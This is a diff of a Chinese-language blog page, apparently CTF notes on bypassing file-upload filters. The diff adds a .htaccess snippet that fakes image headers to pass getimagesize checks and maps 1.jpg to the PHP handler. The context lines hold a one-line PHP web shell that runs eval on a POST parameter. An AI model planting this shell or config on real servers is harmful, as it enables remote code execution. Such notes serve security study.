@@ -27,7 +27,7 @@
 <meta property="og:description" content="首先进行fuzz测试 上传拦截绕过条件竞争 上传拦截绕过1. 黑名单黑白名单判断：	传递一个不存在的后缀，如果能上传说明是黑名单如果是黑名单，可以遍历可利用的后缀字典，看看有没有漏掉过滤的。  windows下 大小写绕过 空格、点、::$DATA 绕过  windows保存文件的时候会自动去掉文件末尾多余的.和空格和::$DATA  1file_put_contents(&#x27;a.php:">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-09T15:56:23.247Z">
+<meta property="article:modified_time" content="2025-03-10T15:52:49.144Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -319,7 +319,9 @@
 </code></pre>
 <h3 id="4-配置文件覆盖"><a href="#4-配置文件覆盖" class="headerlink" title="4. 配置文件覆盖"></a>4. 配置文件覆盖</h3><pre><code class="hljs">上传.ini文件或者.htaccess文件。
 </code></pre>
-<p><strong>.htaccess文件不要有 GIF89A ！！！</strong><br><strong>不然会报语法错误500！！</strong></p>
+<p><strong>.htaccess文件不要有 GIF89A ！！！</strong><br><strong>不然会报语法错误500！！</strong><br>解决方法： 用注释符(#,\x00)并自定义宽高</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs .htaccess">#define width 1<br>#define height 1<br>&lt;FilesMatch &quot;1.jpg&quot;&gt;  <br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
+<p>可以绕过getimagesize和exif_imagetype</p>
 <h3 id="5-文件内容过滤"><a href="#5-文件内容过滤" class="headerlink" title="5. 文件内容过滤"></a>5. 文件内容过滤</h3><p>a. 过滤&lt;?   –&gt;   script 绕过</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-title function_ invoke__">phpinfo</span>();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 <p>b. 有时还会碰到这种奇葩条件</p>
@@ -418,9 +420,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/ssrf/ssrf%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" title="ssrf">
+                      <a href="/blogs/tricks/%E6%8B%BF%E5%88%B0%E9%A2%98%E7%9B%AE%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF/" title="拿到题目后的思路">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ssrf</span>
+                        <span class="hidden-mobile">拿到题目后的思路</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
